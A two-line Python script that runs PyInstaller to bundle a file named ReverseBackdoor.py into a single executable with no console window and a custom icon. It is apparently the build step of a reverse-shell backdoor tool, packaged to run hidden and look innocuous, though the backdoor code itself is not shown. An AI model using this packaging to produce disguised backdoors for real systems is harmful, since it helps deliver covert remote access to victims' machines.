import subprocess
subprocess.check_output("pyinstaller.exe --onefile --noconsole --icon=icon.ico  .\ReverseBackdoor.py",shell=True)